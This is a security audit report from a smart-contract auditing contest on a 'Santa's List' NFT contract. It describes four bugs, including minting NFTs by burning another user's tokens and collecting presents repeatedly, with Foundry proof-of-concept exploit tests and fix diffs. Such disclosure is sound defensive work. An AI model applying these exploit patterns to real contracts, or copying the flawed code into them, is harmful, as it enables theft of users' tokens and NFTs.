# First Flight #5: Santa's List - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. attacker can buy nft using tokens from another user - steal nft](#H-01)
  - ### [H-02. collectPresent function use balanceOf to check if the user has already collect the present - can collect present multiple times](#H-02)
  - ### [H-03. missing access control on checkList function - low impact](#H-03)
- ## Medium Risk Findings
  - ### [M-01. the cost of the NFT via the buyPresent function is wrong - lower profit in the mint](#M-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clpba0ama0001ywpabex01hrp)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 3
- Medium: 1
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. attacker can buy nft using tokens from another user - steal nft

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L173

## Summary

```solidity
    function buyPresent(address presentReceiver) external {
@>      i_santaToken.burn(presentReceiver);
        _mintAndIncrement();
    }
```

The function `SantasList::buyPresent` burns the token of the address passed as argument, but the minted nft is taken buy the user that call the function.

## Vulnerability Details

An attacker can use the tokens of some victims to mint one or more NFTs without paying any tokens and without even having been included by Santa in his list.

I create this test to show the vulnerability:

<details>

<summary>Test code:</summary>

```solidity
    function testBuyPresentWithTokensOfAnotherUser() public {
        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        // The attacker haven't tokens and nfts
        assertEq(santasList.balanceOf(user), 0);
        assertEq(santaToken.balanceOf(user), 0);

        // User2 is ExtraNice
        vm.startPrank(santa);
        santasList.checkList(user2, SantasList.Status.EXTRA_NICE);
        santasList.checkTwice(user2, SantasList.Status.EXTRA_NICE);
        vm.stopPrank();

        // User2 approve token to spend
        vm.startPrank(user2);
        santaToken.approve(address(santasList), 1e18);
        // User2 collect his present and tokens
        santasList.collectPresent();
        // Check if users2 have 1 nft and tokens
        assertEq(santasList.balanceOf(user2), 1);
        assertEq(santaToken.balanceOf(user2), 1000000000000000000);

        // The attacker buy a nft using user2 tokens
        vm.startPrank(user);
        santasList.buyPresent(user2);

        // Now the attacker have 1 nft and the user2 have 0 tokens
        assertEq(santasList.balanceOf(user), 1);
        assertEq(santaToken.balanceOf(user2), 0);
        vm.stopPrank();
    }
```

</details>

## Impact

An attacker can mint how many NFTs he wants using tokens from other victims.

## Tools Used

Manual review and Foundry test.

## Recommendations

The tokens should be burned to the user making the call (msg.sender), and the address passed as an argument should instead be used to mint the nft.

```diff
    function buyPresent(address presentReceiver) external {
-       i_santaToken.burn(presentReceiver);
+      i_santaToken.burn(msg.sender);
-       _mintAndIncrement();
+      _mintAndIncrement(presentReceiver);
    }

+  function _mintAndIncrement(address receiver) private {
+      _safeMint(receiver, s_tokenCounter++);
+  }
```

## <a id='H-02'></a>H-02. collectPresent function use balanceOf to check if the user has already collect the present - can collect present multiple times

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L151

## Summary

The `SantasList::collectPresent` function use `balanceOf(msg.sender)` to check if a user has already get the present. This is not secure because the balance of the account can be changed.

```solidity
    function collectPresent() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
@>      if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
```

## Vulnerability Details

Using `balanceOf(msg.sender)` to check if a user has already get the present, an attacker can move the nft on a second wallet, and can collect another present multiple times.

I created a test to verify the vulnerability.

First of all we have to create a new user inside the `SantasListTest.t.sol` adding a new address.

```diff
    address user = makeAddr("user");
+   address user2 = makeAddr("user2");
```

After that we can paste this test

<details>

<summary>Code:</summary>

```solidity
    function testCollectPresentNiceTwice() public {
        vm.startPrank(santa);
        santasList.checkList(user, SantasList.Status.NICE);
        santasList.checkTwice(user, SantasList.Status.NICE);
        vm.stopPrank();

        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

        vm.startPrank(user);
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);

        // User send token to user2 account
        santasList.safeTransferFrom(address(user), address(user2), 0);
        assertEq(santasList.balanceOf(user), 0);

        // User can not collect another present
        santasList.collectPresent();
        assertEq(santasList.balanceOf(user), 1);

        // Move the previous present from original address
        vm.startPrank(user2);
        santasList.safeTransferFrom(address(user2), address(user), 0);

        // Now user have 2 presents
        vm.startPrank(user);
        assertEq(santasList.balanceOf(user), 2);

        vm.stopPrank();
    }
```

</details>

and then we can launch the test with the command

```
forge test --mt testCollectPresentNiceTwice -vvv
```

## Impact

An attacker can collect multiple NFTs with this technique. If the user have status EXTRA_NICE he can also mint tokens multiple times.

## Tools Used

Manual review and Foundry test

## Recommendations

It is better to use a mapping and save the addresses that have already collect the NFT.

```diff
  mapping(address person => Status naughtyOrNice) private s_theListCheckedOnce;
  mapping(address person => Status naughtyOrNice) private s_theListCheckedTwice;
+  mapping(address person => uint256) private s_presentsCollected;
...
function collectPresent() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
-       if (balanceOf(msg.sender) > 0) {
+       if (s_presentsCollected[msg.sender] > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (
            s_theListCheckedOnce[msg.sender] == Status.NICE &&
            s_theListCheckedTwice[msg.sender] == Status.NICE
        ) {
            _mintAndIncrement();
+           s_presentsCollected[msg.sender] = block.timestamp;
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE &&
            s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
+           s_presentsCollected[msg.sender] = block.timestamp;
            return;
        }
        revert SantasList__NotNice();
    }
```

## <a id='H-03'></a>H-03. missing access control on checkList function - low impact

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L121

## Summary

The comment on the function `SantasList::checkList` say `Only callable by santa` but the function don't have the modifier `onlySanta`.

```solidity
@> function checkList(address person, Status status) external {
      s_theListCheckedOnce[person] = status;
      emit CheckedOnce(person, status);
   }
```

## Vulnerability Details

The modifier `onlySanta` is missed on `SantasList::checkList` function, so everyone can update the status of an address on the `s_theListCheckedOnce` mapping.

## Impact

The impact is low because there is the second function `SantasList::checkTwice` to confirm the status of an address, and it has the `onlySanta` modifier.

## Tools Used

Manual review

## Recommendations

Add the modifier `onlySanta` in the function.

```diff
- function checkList(address person, Status status) external {
+ function checkList(address person, Status status) external onlySanta {
        s_theListCheckedOnce[person] = status;
        emit CheckedOnce(person, status);
    }
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. the cost of the NFT via the buyPresent function is wrong - lower profit in the mint

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantaToken.sol#L32

## Summary

Reading the documentation you understand that the cost should be 2e18 instead of 1e18: `buyPresent: A function that trades 2e18 of SantaToken for an NFT. This function can be called by anyone.`.
But the `SantaToken::burn` has the wrong amount.

```solidity
    function burn(address from) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
@>      _burn(from, 1e18);
    }
```

## Vulnerability Details

The cost of using the `SantasList::buyPresent` feature should be 2e18 instead of 1e18, so your profit will be halved.
In the `SantasList` code there is a constant `PURCHASED_PRESENT_COST` (which is not used) that should be used in the SantaToken contract.

## Impact

The profit from the sale of NFTs through tokens will have a halved profit.

## Tools Used

Manual review

## Recommendations

The `SantaToken::burn` function needs to be modified by changing the amount of tokens to burn, using the constant `SantasList::PURCHASED_PRESENT_COST` that was mistakenly placed in the `SantasList` contract.

So, in `SantasList` we need to remove the constant

```diff
    // This variable is ok even if it's off by 24 hours.
    uint256 public constant CHRISTMAS_2023_BLOCK_TIME = 1_703_480_381;
-   // The cost of santa tokens for naughty people to buy presents
-   uint256 public constant PURCHASED_PRESENT_COST = 2e18;
```

and move it inside the `SantaToken` contract, after that we update the `burn` function

```diff
+  // The cost of santa tokens for naughty people to buy presents
+  uint256 public constant PURCHASED_PRESENT_COST = 2e18;
....
    function burn(address from) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
-      _burn(from, 1e18);
+      _burn(from, PURCHASED_PRESENT_COST);
    }
```
